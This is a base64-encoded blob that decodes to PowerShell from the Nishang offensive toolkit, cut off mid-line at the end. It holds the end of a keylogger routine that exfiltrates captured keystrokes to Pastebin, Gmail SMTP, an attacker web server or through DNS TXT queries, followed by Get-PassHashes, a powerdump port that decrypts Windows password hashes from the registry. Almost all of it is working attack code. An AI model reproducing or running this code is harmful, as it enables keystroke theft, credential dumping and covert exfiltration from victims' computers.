AgICAgICAgICAgIHsKICAgICAgICAgICAgICAgICR1dGZieXRlcyAgPSBbU3lzdGVtLlRleHQuRW5jb2RpbmddOjpVVEY4LkdldEJ5dGVzKCREYXRhKQogICAgICAgICAgICAgICAgJHBhc3RldmFsdWUgPSBbU3lzdGVtLkNvbnZlcnRdOjpUb0Jhc2U2NFN0cmluZygkdXRmYnl0ZXMpCiAgICAgICAgICAgICAgICBwb3N0X2h0dHAgImh0dHBzOi8vcGFzdGViaW4uY29tL2FwaS9hcGlfbG9naW4ucGhwIiAiYXBpX2Rldl9rZXk9JGRldl9rZXkmYXBpX3VzZXJfbmFtZT0kdXNlcm5hbWUmYXBpX3VzZXJfcGFzc3dvcmQ9JHBhc3N3b3JkIiAKICAgICAgICAgICAgICAgIHBvc3RfaHR0cCAiaHR0cHM6Ly9wYXN0ZWJpbi5jb20vYXBpL2FwaV9wb3N0LnBocCIgImFwaV91c2VyX2tleT0kc2Vzc2lvbl9rZXkmYXBpX29wdGlvbj1wYXN0ZSZhcGlfZGV2X2tleT0kZGV2X2tleSZhcGlfcGFzdGVfbmFtZT0kcGFzdGVuYW1lJmFwaV9wYXN0ZV9jb2RlPSRwYXN0ZXZhbHVlJmFwaV9wYXN0ZV9wcml2YXRlPTIiIAogICAgICAgICAgICB9CiAgICAgICAgCiAgICAgICAgICAgIGVsc2VpZiAoJGV4Zmlsb3B0aW9uIC1lcSAiZ21haWwiKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAjaHR0cDovL3N0YWNrb3ZlcmZsb3cuY29tL3F1ZXN0aW9ucy8xMjUyMzM1L3NlbmQtbWFpbC12aWEtZ21haWwtd2l0aC1wb3dlcnNoZWxsLXYycy1zZW5kLW1haWxtZXNzYWdlCiAgICAgICAgICAgICAgICAkc210cHNlcnZlciA9ICJzbXRwLmdtYWlsLmNvbSIKICAgICAgICAgICAgICAgICRtc2cgPSBuZXctb2JqZWN0IE5ldC5NYWlsLk1haWxNZXNzYWdlCiAgICAgICAgICAgICAgICAkc210cCA9IG5ldy1vYmplY3QgTmV0Lk1haWwuU210cENsaWVudCgkc210cFNlcnZlciApCiAgICAgICAgICAgICAgICAkc210cC5FbmFibGVTc2wgPSAkVHJ1ZQogICAgICAgICAgICAgICAgJHNtdHAuQ3JlZGVudGlhbHMgPSBOZXctT2JqZWN0IFN5c3RlbS5OZXQuTmV0d29ya0NyZWRlbnRpYWwoIiR1c2VybmFtZSIsICIkcGFzc3dvcmQiKTsgCiAgICAgICAgICAgICAgICAkbXNnLkZyb20gPSAiJHVzZXJuYW1lQGdtYWlsLmNvbSIKICAgICAgICAgICAgICAgICRtc2cuVG8uQWRkKCIkdXNlcm5hbWVAZ21haWwuY29tIikKICAgICAgICAgICAgICAgICRtc2cuU3ViamVjdCA9ICRwYXN0ZW5hbWUKICAgICAgICAgICAgICAgICRtc2cuQm9keSA9ICRwYXN0ZXZhbHVlCiAgICAgICAgICAgICAgICBpZiAoJGZpbGVuYW1lKQogICAgICAgICAgICAgICAgewogICAgICAgICAgICAgICAgICAgICRhdHQgPSBuZXctb2JqZWN0IE5ldC5NYWlsLkF0dGFjaG1lbnQoJGZpbGVuYW1lKQogICAgICAgICAgICAgICAgICAgICRtc2cuQXR0YWNobWVudHMuQWRkKCRhdHQpCiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICAkc210cC5TZW5kKCRtc2cpCiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGVsc2VpZiAoJGV4Zmlsb3B0aW9uIC1lcSAid2Vic2VydmVyIikKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJERhdGEgPSBDb21wcmVzcy1FbmNvZGUKICAgICAgICAgICAgICAgIHBvc3RfaHR0cCAkVVJMICREYXRhCiAgICAgICAgICAgIH0KICAgICAgICAgICAgZWxzZWlmICgkRXhmaWxPcHRpb24gLWVxICJETlMiKQogICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAkY29kZSA9IENvbXByZXNzLUVuY29kZQogICAgICAgICAgICAgICAgJGxlbmd0aG9mc3Vic3RyID0gMAogICAgICAgICAgICAgICAgJHF1ZXJpZXMgPSBbaW50XSgkY29kZS5MZW5ndGgvNjMpCiAgICAgICAgICAgICAgICB3aGlsZSAoJHF1ZXJpZXMgLW5lIDApCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgJHF1ZXJ5c3RyaW5nID0gJGNvZGUuU3Vic3RyaW5nKCRsZW5ndGhvZnN1YnN0ciw2MykKICAgICAgICAgICAgICAgICAgICBJbnZva2UtRXhwcmVzc2lvbiAibnNsb29rdXAgLXF1ZXJ5dHlwZT10eHQgJHF1ZXJ5c3RyaW5nLiREb21hTmFtZSAkQXV0aE5TIgogICAgICAgICAgICAgICAgICAgICRsZW5ndGhvZnN1YnN0ciArPSA2MwogICAgICAgICAgICAgICAgICAgICRxdWVyaWVzIC09IDEKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgICAgICRtb2QgPSAkY29kZS5MZW5ndGglNjMKICAgICAgICAgICAgICAgICRxdWVyeSA9ICRjb2RlLlN1YnN0cmluZygkY29kZS5MZW5ndGggLSAkbW9kLCAkbW9kKQogICAgICAgICAgICAgICAgSW52b2tlLUV4cHJlc3Npb24gIm5zbG9va3VwIC1xdWVyeXR5cGU9dHh0ICRxdWVyeS4kRG9tYWluTmFtZSAkQXV0aE5TIgoKICAgICAgICAgICAgfQoKICAgICAgICAgICAgJGNoZWNrKysKICAgICAgICAgICAgaWYgKCRjaGVjayAtZXEgNjAwMCkKICAgICAgICAgICAgewogICAgICAgICAgICAgICAgJGNoZWNrID0gMAogICAgICAgICAgICAgICAgJHdlYmNsaWVudCA9IE5ldy1PYmplY3QgU3lzdGVtLk5ldC5XZWJDbGllbnQKICAgICAgICAgICAgICAgICRmaWxlY29udGVudCA9ICR3ZWJjbGllbnQuRG93bmxvYWRTdHJpbmcoIiRDaGVja1VSTCIpCiAgICAgICAgICAgICAgICBpZiAoJGZpbGVjb250ZW50IC1lcSAkTWFnaWNTdHJpbmcpCiAgICAgICAgICAgICAgICB7CiAgICAgICAgICAgICAgICAgICAgYnJlYWsKICAgICAgICAgICAgICAgIH0KICAgICAgICAgICAgfQogICAgICAgIH0KICAgIH0KfQoKICAgICAgICBpZiAoJGV4ZmlsIC1lcSAkVHJ1ZSkKICAgICAgICB7CiAgICAgICAgICAgIHN0YXJ0LWpvYiAtSW5pdGlhbGl6YXRpb25TY3JpcHQgJGZ1bmN0aW9ucyAtc2NyaXB0YmxvY2sge0tleXBhc3RlICRhcmdzWzBdICRhcmdzWzFdICRhcmdzWzJdICRhcmdzWzNdICRhcmdzWzRdICRhcmdzWzVdICRhcmdzWzZdICRhcmdzWzddfSAtQXJndW1lbnRMaXN0IEAoJEV4ZmlsT3B0aW9uLCRkZXZfa2V5LCR1c2VybmFtZSwkcGFzc3dvcmQsJFVSTCwkQXV0aE5TLCRNYWdpY1N0cmluZywkQ2hlY2tVUkwpCiAgICAgICAgICAgIHN0YXJ0LWpvYiAtSW5pdGlhbGl6YXRpb25TY3JpcHQgJGZ1bmN0aW9ucyAtc2NyaXB0YmxvY2sge0tleWxvZyAkYXJnc1swXSAkYXJnc1sxXX0gLUFyZ3VtZW50TGlzdCBAKCRNYWdpY1N0cmluZywkQ2hlY2tVUkwpCiAgICAgICAgfQogICAgICAgIGVsc2UKICAgICAgICB7CiAgICAgICAgICAgIHN0YXJ0LWpvYiAtSW5pdGlhbGl6YXRpb25TY3JpcHQgJGZ1bmN0aW9ucyAtc2NyaXB0YmxvY2sge0tleWxvZyAkYXJnc1swXSAkYXJnc1sxXX0gLUFyZ3VtZW50TGlzdCBAKCRNYWdpY1N0cmluZywkQ2hlY2tVUkwpCiAgICAgICAgfQp9CgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjI0R1bXAgd2luZG93cyBwYXNzd29yZCBoYXNoZXMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIwojIyNUaGFua3MgRGF2aWQgS2VubmVkeSMjIwojIyNwb3dlcmR1bXAucmIgZnJvbSBtc2YKZnVuY3Rpb24gR2V0LVBhc3NIYXNoZXMgeyAKPCMgCi5TWU5PUFNJUyAKTmlzaGFuZyBwYXlsb2FkIHdoaWNoIGR1bXBzIHBhc3N3b3JkIGhhc2hlcy4gCiAKLkRFU0NSSVBUSU9OIApUaGUgcGF5bG9hZCBkdW1wcyBwYXNzd29yZCBoYXNoZXMgdXNpbmcgdGhlIG1vZGlmaWVkIHBvd2VyZHVtcCBzY3JpcHQgZnJvbSBNU0YuIEFkbWluaXN0cmF0b3IgcHJpdmlsZWdlcyBhcmUgcmVxdWlyZWQgZm9yIHRoaXMgc2NyaXB0CihidXQgbm90IFNZU1RFTSBwcml2cyBhcyBmb3IgdGhlIG9yaWdpbmFsIHBvd2VyZHVtcCkKCi5FWEFNUExFIApQUyA+IEdldC1QYXNzSGFzaGVzCiAKLkxJTksgCmh0dHA6Ly93d3cubGFib2ZhcGVuZXRyYXRpb250ZXN0ZXIuY29tLzIwMTMvMDUvcG9zaGluZy1oYXNoZXMtcGFydC0yLmh0bWw/c2hvd0NvbW1lbnQ9MTM4NjcyNTg3NDE2NyNjODUxMzk4MDcyNTgyMzc2NDA2MApodHRwczovL2dpdGh1Yi5jb20vc2FtcmF0YXNob2svbmlzaGFuZwoKIz4gCltDbWRsZXRCaW5kaW5nKCldClBhcmFtICgpCgoKIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjcG93ZXJkdW1wIHdyaXR0ZW4gYnkgRGF2aWQgS2VubmVkeSMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjIyMjCmZ1bmN0aW9uIExvYWRBcGkKewogICAgJG9sZEVycm9yQWN0aW9uID0gJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2U7CiAgICAkZ2xvYmFsOkVycm9yQWN0aW9uUHJlZmVyZW5jZSA9ICJTaWxlbnRseUNvbnRpbnVlIjsKICAgICR0ZXN0ID0gW1Bvd2VyRHVtcC5OYXRpdmVdOwogICAgJGdsb2JhbDpFcnJvckFjdGlvblByZWZlcmVuY2UgPSAkb2xkRXJyb3JBY3Rpb247CiAgICBpZiAoJHRlc3QpCiAgICB7CiAgICAgICAgIyBhbHJlYWR5IGxvYWRlZAogICAgICAgIHJldHVybjsKICAgICB9CgokY29kZSA9IEAnCnVzaW5nIFN5c3RlbTsKdXNpbmcgU3lzdGVtLlNlY3VyaXR5LkNyeXB0b2dyYXBoeTsKdXNpbmcgU3lzdGVtLlJ1bnRpbWUuSW50ZXJvcFNlcnZpY2VzOwp1c2luZyBTeXN0ZW0uVGV4dDsKCm5hbWVzcGFjZSBQb3dlckR1bXAKewogICAgcHVibGljIGNsYXNzIE5hdGl2ZQogICAgewogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgQ2hhclNldCA9IENoYXJTZXQuQXV0byldCiAgICAgcHVibGljIHN0YXRpYyBleHRlcm4gaW50IFJlZ09wZW5LZXlFeCgKICAgICAgICBpbnQgaEtleSwKICAgICAgICBzdHJpbmcgc3ViS2V5LAogICAgICAgIGludCB1bE9wdGlvbnMsCiAgICAgICAgaW50IHNhbURlc2lyZWQsCiAgICAgICAgb3V0IGludCBoa1Jlc3VsdCk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludCA9ICJSZWdFbnVtS2V5RXgiKV0KICAgIGV4dGVybiBwdWJsaWMgc3RhdGljIGludCBSZWdFbnVtS2V5RXgoCiAgICAgICAgaW50IGhrZXksCiAgICAgICAgaW50IGluZGV4LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBOYW1lLAogICAgICAgIHJlZiBpbnQgbHBjYk5hbWUsCiAgICAgICAgaW50IHJlc2VydmVkLAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBvdXQgbG9uZyBscGZ0TGFzdFdyaXRlVGltZSk7CgogICAgW0RsbEltcG9ydCgiYWR2YXBpMzIuZGxsIiwgRW50cnlQb2ludD0iUmVnUXVlcnlJbmZvS2V5IiwgQ2FsbGluZ0NvbnZlbnRpb249Q2FsbGluZ0NvbnZlbnRpb24uV2luYXBpLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBleHRlcm4gcHVibGljIHN0YXRpYyBpbnQgUmVnUXVlcnlJbmZvS2V5KAogICAgICAgIGludCBoa2V5LAogICAgICAgIFN0cmluZ0J1aWxkZXIgbHBDbGFzcywKICAgICAgICByZWYgaW50IGxwY2JDbGFzcywKICAgICAgICBpbnQgbHBSZXNlcnZlZCwKICAgICAgICBvdXQgaW50IGxwY1N1YktleXMsCiAgICAgICAgb3V0IGludCBscGNiTWF4U3ViS2V5TGVuLAogICAgICAgIG91dCBpbnQgbHBjYk1heENsYXNzTGVuLAogICAgICAgIG91dCBpbnQgbHBjVmFsdWVzLAogICAgICAgIG91dCBpbnQgbHBjYk1heFZhbHVlTmFtZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JNYXhWYWx1ZUxlbiwKICAgICAgICBvdXQgaW50IGxwY2JTZWN1cml0eURlc2NyaXB0b3IsCiAgICAgICAgSW50UHRyIGxwZnRMYXN0V3JpdGVUaW1lKTsKCiAgICBbRGxsSW1wb3J0KCJhZHZhcGkzMi5kbGwiLCBTZXRMYXN0RXJyb3I9dHJ1ZSldCiAgICBwdWJsaWMgc3RhdGljIGV4dGVybiBpbnQgUmVnQ2xvc2VLZXkoCiAgICAgICAgaW50IGhLZXkpOwoKICAgICAgICB9CiAgICB9IC8vIGVuZCBuYW1lc3BhY2UgUG93ZXJEdW1wCgogICAgcHVibGljIGNsYXNzIFNoaWZ0IHsKICAgICAgICBwdWJsaWMgc3RhdGljIGludCAgIFJpZ2h0KGludCB4LCAgIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWludCAgUmlnaHQodWludCB4LCAgaW50IGNvdW50KSB7IHJldHVybiB4ID4+IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyBsb25nICBSaWdodChsb25nIHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPj4gY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIHVsb25nIFJpZ2h0KHVsb25nIHgsIGludCBjb3VudCkgeyByZXR1cm4geCA+PiBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgaW50ICAgIExlZnQoaW50IHgsICAgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICAgICAgcHVibGljIHN0YXRpYyB1aW50ICAgTGVmdCh1aW50IHgsICBpbnQgY291bnQpIHsgcmV0dXJuIHggPDwgY291bnQ7IH0KICAgICAgICBwdWJsaWMgc3RhdGljIGxvbmcgICBMZWZ0KGxvbmcgeCwgIGludCBjb3VudCkgeyByZXR1cm4geCA8PCBjb3VudDsgfQogICAgICAgIHB1YmxpYyBzdGF0aWMgdWxvbmcgIExlZnQodWxvbmcgeCwgaW50IGNvdW50KSB7IHJldHVybiB4IDw8IGNvdW50OyB9CiAgICB9CidACgogICAkcHJvdmlkZXIgPSBOZXctT2JqZWN0IE1pY3Jvc29mdC5DU2hhcnAuQ1NoYXJwQ29kZVByb3ZpZGVyCiAgICRkbGxOYW1lID0gW1BzT2JqZWN0XS5Bc3NlbWJseS5Mb2NhdGlvbgogICAkY29tcGlsZXJQYXJhbWV0ZXJzID0gTmV3LU9iamVjdCBTeXN0ZW0uQ29kZURvbS5Db21waWxlci5Db21waWxlclBhcmFtZXRlcnMKICAgJGFzc2VtYmxpZXMgPSBAKCJTeXN0ZW0uZGxsIiwgJGRsbE5hbWUpCiAgICRjb21waWxlclBhcmFtZXRlcnMuUmVmZXJlbmNlZEFzc2VtYmxpZXMuQWRkUmFuZ2UoJGFzc2VtYmxpZXMpCiAgICRjb21waWxlclBhcmFtZXRlcnMuR2VuZXJhdGVJbk1lbW9yeSA9ICR0cnVlCiAgICRjb21waWxlclJlc3VsdHMgPSAkcHJvdmlkZXIuQ29tcGlsZUFzc2VtYmx5RnJvbVNvdXJjZSgkY29tcGlsZXJQYXJhbWV0ZXJzLCAkY29kZSkKICAgaWYoJGNvbXBpbGVyUmVzdWx0cy5FcnJvcnMuQ291bnQgLWd0IDApIHsKICAgICAkY29tcGlsZXJSZXN1bHRzLkVycm9ycyB8ICUgeyBXcml0ZS1FcnJvciAoInswfTpgdHsxfSIgLWYgJF8uTGluZSwkXy5FcnJvclRleHQpIH0KICAgfQoKfQoKJGFudHBhc3N3b3JkID0gW1RleHQuRW5jb2RpbmddOjpBU0NJSS5HZXRCeXRlcygiTlRQQVNTV09SRGAwIik7CiRhbG1wYXNzd29yZCA9IFtUZXh0LkVuY29kaW5nXTo6QVNDSUkuR2V0Qnl0ZXMoIkxNUEFTU1dPUkRgMCIpOwokZW1wdHlfbG0gPSBbYnl0ZVtdXUAoMHhhYSwweGQzLDB4YjQsMHgzNSwweGI1LDB4MTQsMHgwNCwweGVlLDB4YWEsMHhkMywweGI0LDB4MzUsMHhiNSwweDE0LDB4MDQsMHhlZSk7CiRlbXB0eV9udCA9IFtieXRlW11dQCgweDMxLDB4ZDYsMHhjZiwweGUwLDB4ZDEsMHg2YSwweGU5LDB4MzEsMHhiNywweDNjLDB4NTksMHhkNywweGUwLDB4YzAsMHg4OSwweGMwKTsKJG9kZF9wYXJpdHkgPSBAKAogIDEsIDEsIDIsIDIsIDQsIDQsIDcsIDcsIDgsIDgsIDExLCAxMSwgMTMsIDEzLCAxNCwgMTQsCiAgMTYsIDE2LCAxOSwgMTksIDIxLCAyMSwgMjIsIDIyLCAyNSwgMjUsIDI2LCAyNiwgMjgsIDI4LCAzMSwgMzEsCiAgMzIsIDMyLCAzNSwgMzUsIDM3LCAzNywgMzgsIDM4LCA0MSwgNDEsIDQyLCA0MiwgNDQsIDQ0LCA0NywgNDcsCiAgNDksIDQ5LCA1MCwgNTAsIDUyLCA1MiwgNTUsIDU1LCA1NiwgNTYsIDU5LCA1OSwgNjEsIDYxLCA2MiwgNjIsCiAgNjQsIDY0LCA2NywgNjcsIDY5LCA2OSwgNzAsIDcwLCA3MywgNzMsIDc0LCA3NCwgNzYsIDc2LCA3OSwgNzksCiAgODEsIDgxLCA4MiwgODIsIDg0LCA4NCwgODcsIDg3LCA4OCwgODgsIDkxLCA5MSwgOTMsIDkzLCA5NCwgOTQsCiAgOTcsIDk3LCA5OCwgOTgsMTAwLDEwMCwxMDMsMTAzLDEwNCwxMDQsMTA3LDEwNywxMDksMTA5LDExMCwxMTAsCiAgMTEyLDExMiwxMTUsMTE1LDExNywxMTcsMTE4LDExOCwxMjEsMTIxLDEyMiwxMjIsMTI0LDEyNCwxMjcsMTI3LAogIDEyOCwxMjgsMTMxLDEzMSwxMzMsMTMzLDEzNCwxMzQsMTM3LDEzNywxMzgsMTM4LDE0MCwxNDAsMTQzLDE0MywKICAxNDUsMTQ1LDE0NiwxNDYsMTQ4LDE0OCwxNTEsMTUxLDE1MiwxNTIsMTU1LDE1NSwxNTcsMTU3LDE1OCwxNTgsCiAgMTYxLDE2MSwxNjIsMTYyLDE2NCwxNjQsMTY3LDE2NywxNjgsMTY4LDE3MSwxNzEsMTczLDE3MywxNzQsMTc0LAogIDE3NiwxNzYsMTc5LDE3OSwxODEsMTgxLDE4MiwxODIsMTg1LDE4NSwxODYsMTg2LDE4OCwxODgsMTkxLDE5MSwKICAxOTMsMTkzLDE5NCwxOTQsMTk2LDE5NiwxOTksMTk5LDIwMCwyMDAsMjAzLDIwMywyMDUsMjA1LDIwNiwyMDYsCiAgMjA4LDIwOCwyMTEsMjExLDIxMywyMTMsMjE0LDIxNCwyMTcsMjE3LDIxOCwyMTgsMjIwLDIyMCwyMjMsMjIzLAogIDIyNCwyMjQsMjI3LDIyNywyMjksMjI5LDIzMCwyMzAsMjMzLDIzMywyMzQsMjM0LDIzNiwyMzYsMjM5LDIzOSwKICAyNDEsMjQxLDI0MiwyNDIsMjQ0LDI0NCwyNDcsMjQ3LDI0OCwyNDgsMjUxLDI1MSwyNTMsMjUzLDI1NCwyNTQKKTsKCmZ1bmN0aW9uIHNpZF90b19rZXkoJHNpZCkKewogICAgJHMxID0gQCgpOwogICAgJHMxICs9IFtjaGFyXSgkc2lkIC1iYW5kIDB4RkYpOwogICAgJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDgpIC1iYW5kIDB4RkYpOwogICAgJHMxICs9IFtjaGFyXShbU2hpZnRdOjpSaWdodCgkc2lkLDE2KSAtYmFuZCAweEZGKTsKICAgICRzMSArPSBbY2hhcl0oW1NoaWZ0XTo6UmlnaHQoJHNpZCwyNCkgLWJhbmQgMHhGRik7CiAgICAkczEgKz0gJHMxWzBdOwogICAgJHMxICs9ICRzMVsxXTsKICAgICRzMSArPSAkczFbMl07CiAgICAkczIgPSBAKCk7CiAgICAkczIgKz0gJHMxWzNdOyAkczIgKz0gJHMxWzBdOyAkczIgKz0gJHMxWzFdOyAkczIgKz0gJHMxWzJdOwogICAgJHMyICs9ICRzMlswXTsgJHMyICs9ICRzMlsxXTsgJHMyICs9ICRzMlsyXTsKICAgIHJldHVybiAsKChzdHJfdG9fa2V5ICRzMSksKHN0cl90b19rZXkgJHMyKSk7Cn0KCmZ1bmN0aW9uIHN0cl90b19rZXkoJHMpCnsKICAgICRrZXkgPSBAKCk7CiAgICAka2V5ICs9IFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzBdKSwgMSApOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzBdKSAtYmFuZCAweDAxKSwgNikgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1sxXSksMik7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbMV0pIC1iYW5kIDB4MDMpLCA1KSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzJdKSwzKTsKICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1syXSkgLWJhbmQgMHgwNyksIDQpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbM10pLDQpOwogICAgJGtleSArPSBbU2hpZnRdOjpMZWZ0KCAkKFtpbnRdKCRzWzNdKSAtYmFuZCAweDBGKSwgMykgLWJvciBbU2hpZnRdOjpSaWdodChbaW50XSgkc1s0XSksNSk7CiAgICAka2V5ICs9IFtTaGlmdF06OkxlZnQoICQoW2ludF0oJHNbNF0pIC1iYW5kIDB4MUYpLCAyKSAtYm9yIFtTaGlmdF06OlJpZ2h0KFtpbnRdKCRzWzVdKSw2KTsKICAgICRrZXkgKz0gW1NoaWZ0XTo6TGVmdCggJChbaW50XSgkc1s1XSkgLWJhbmQgMHgzRiksIDEpIC1ib3IgW1NoaWZ0XTo6UmlnaHQoW2ludF0oJHNbNl0pLDcpOwogICAgJGtleSArPSAkKFtpbnRdKCRzWzZdKSAtYmFuZCAweDdGKTsKICAgIDAuLjcgfCAlewogICAgICAgICRrZXlbJF9dID0gW1NoaWZ0XTo6TGVmdCgka2V5WyRfXSwgMSk7CiAgICAgICAgJGtleVskX10gPSAkb2RkX3Bhcml0eVska2V5WyRfXV07CiAgICAgICAgfQogICAgcmV0dXJuICwka2V5Owp9CgpmdW5jdGlvbiBOZXdSQzQoW2J5dGVbXV0ka2V5KQp7CiAgICByZXR1cm4gbmV3LW9iamVjdCBPYmplY3QgfAogICAgQWRkLU1lbWJlciBOb3RlUHJvcGVydHkga2V5ICRrZXkgLVBhc3NUaHJ1IHwKICAgIEFkZC1NZW1iZXIgTm90ZVByb3BlcnR5IFMgJG51bGwgLVBhc3NUaHJ1IHwKICAgIEFkZC1NZW1iZXIgU2NyaXB0TWV0aG9kIGluaXQgewogICAgICAgIGlmICgtbm90ICR0aGlzLlMpCiAgICAgICAgewogICAgICAgICAgICBbYnl0ZVtdXSR0aGlzLlMgPSAwLi4yNTU7CiAgICAgICAgICAgIDAuLjI1NSB8ICUgLWJlZ2lue1tsb25nXSRqPTA7fXsKICAgICAgICAgICAgICAgICRqID0gKCRqICsgJHRoaXMua2V5WyQoJF8gJSAkdGhpcy5rZXkuTGVuZ3RoKV0gKyAkdGhpcy5TWyRfXSkgJSAkdGhpcy5TLkxlbmd0aDsKICAgICAgICAgICAgICAgICR0ZW1wID0gJHRoaXMuU1skX107ICR0aGlzLlNbJF9dID0gJHRoaXMuU1skal07ICR0aGlzLlNbJGpdID0gJHRlbXA7CiAgICAgICAgICAgICAgICB9CiAgICAgICAgfQogICAgfSAtUGFzc1RocnUgfAogICAgQWRkLU1lbWJlciBTY3JpcHRNZXRob2QgImVuY3J5cHQiIHsKICAgICAgICAkZGF0YSA9ICRhcmdzWzBdOwogICAgICAgICR0aGlzLmluaXQoKTsKICAgICAgICAkb3V0YnVmID0gbmV3LW9iamVjdCBieXRlW10gJCgkZGF0YS5MZW5ndGgpOwogICAgICAgICRTMiA9ICR0aGlzLlNbMC4uJHRoaXMuUy5MZW5ndGhdOwogICAgICAgIDAuLiQoJGRhdGEuTGVuZ3RoLTEpIHwgJSAtYmVnaW57JGk9MDskaj0wO30gewogICAgICAgICAgICAkaSA9ICgkaSsxKSAlICRTMi5MZW5ndGg7CiAgICAgICAgICAgICRqID0gKCRqICsgJFMyWyRpXSkgJSAkUzIuTGVuZ3RoOwogICAgICAgICAgICAkdGVtcCA9ICRTMlskaV07JFMyWyRpXSA9ICRTMlskal07JFMyWyRqXSA9ICR0ZW1wOwogICAgICAgICAgICAkYSA9ICRkYXRhWyRfXTsKICAgICAgICAgICAgJGIgPSAkUzJbICQoJFMyWyRpXSskUzJbJGpdKSAlICRTMi5MZW5ndGggXTsKICAgICAgICAgICAgJG91dGJ1ZlskX10gPSAoJGEgLWJ4b3IgJGIpOwogICAgICAgIH0KICAgICAgICByZXR1cm4gLCRvdXRidWY7CiAgICB9IC1QYXNzVGhydQp9CgpmdW5jdGlvbiBkZXNfZW5jcnlwdChbYnl0ZVtdXSRkYXRhLCBbYnl0ZVtdXSRrZXkpCnsKICAgIHJldHVybiAsKGRlc190cmFuc2Zvcm0gJGRhdGEgJGtleSAkdHJ1ZSkKfQoKZnVuY3Rpb24gZGVzX2RlY3J5cHQoW2J5dGVbXV0kZGF0YSwgW2J5dGVbXV0ka2V5KQp7CiAgICByZXR1cm4gLChkZXNfdHJhbnNmb3JtICRkYXRhICRrZXkgJGZhbHNlKQp9CgpmdW5jdGlvbiBkZXNfdHJhbnNmb3JtKFtieXRlW11dJGRhdGEsIFtieXRlW11dJGtleSwgJGRvRW5jcnlwdCkKewogICAgJGRlcyA9IG5ldy1vYmplY3QgU2VjdXJpdHkuQ3J5cHRvZ3JhcGh5LkRFU0NyeXB0b1NlcnZpY2VQcm92aWRlcjsKICAgICRkZXMuTW9kZSA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuQ2lwaGVyTW9kZV06OkVDQjsKICAgICRkZXMuUGFkZGluZyA9IFtTZWN1cml0eS5DcnlwdG9ncmFwaHkuUGFkZGluZ01vZGVdOjpOb25lOwogICAgJGRlcy5LZXkgPSAka2V5OwogICAgJGRlcy5JViA9ICRrZXk7CiAgICAkdHJhbnNmb3JtID0gJG51bGw7CiAgICBpZiAoJGRvRW5jcnlwdCkgeyR0cmFuc2Zvcm0gPSAkZGVzLkNyZWF0ZUVuY3J5cHRvcigpO30KICAgIGVsc2V7JHRyYW5zZm9ybSA9ICRkZXMuQ3JlYXRlRGVjcnlwdG9yKCk7fQogICAgJHJlc3VsdCA9ICR0cmFuc2Zvcm0uVHJhbnNmb3JtRmluYWxCbG9jaygkZGF0YSwgMCwgJGRhdGEuTGVuZ3RoKTsKICAgIHJldHVybiAsJHJlc3VsdDsKfQoKZnVuY3Rpb24gR2V0LVJlZ0tleUNsYXNzKFtzdHJpbmddJGtleSwgW3N0cmluZ10kc3Via2V5KQp7CiAgICBzd2l0Y2ggKCRLZXkpIHsKICAgICAgICAiSEtDUiIgeyAkbktleSA9IDB4ODAwMDAwMDB9ICNISyBDbGFzc2VzIFJvb3QKICAgICAgICAiSEtDVSIgeyAkbktleSA9IDB4ODAwMDAwMDF9ICNISyBDdXJyZW50IFVzZXIKICAgICAgICAiSEtMTSIgeyAkbktleSA9IDB4ODAwMDAwMDJ9ICNISyBMb2NhbCBNYWNoaW5lCiAgICAgICAgIkhLVSIgIHsgJG5LZXkgPSAweDgwMDAwMDAzfSAjSEsgVXNlcnMKICAgICAgICAiSEtDQyIgeyAkbktleSA9IDB4ODAwMDAwMDV9ICNISyBDdXJyZW50IENvbmZpZwogICAgICAgIGRlZmF1bHQgewogICAgICAgICAgICB0aHJvdyAiSW52YWxpZCBLZXkuIFVzZSBvbmUgb2YgdGhlIGZvbGxvd2luZyBvcHRpb25zIEhLQ1IsIEhLQ1UsIEhLTE0sIEhLVSwgSEtDQyIKICAgICAgICB9CiAgICB9CiAgICAkS0VZUVVFUllWQUxVRSA9IDB4MTsKICAgICRLRVlSRUFEID0gMHgxOTsKICAgICRLRVlBTExBQ0NFU1MgPSAweDNGOwogICAgJHJlc3VsdCA9ICIiOwogICAgW2ludF0kaGtleT0wCiAgICBpZiAoLW5vdCBbUG93ZXJEdW1wLk5hdGl2ZV06OlJlZ09w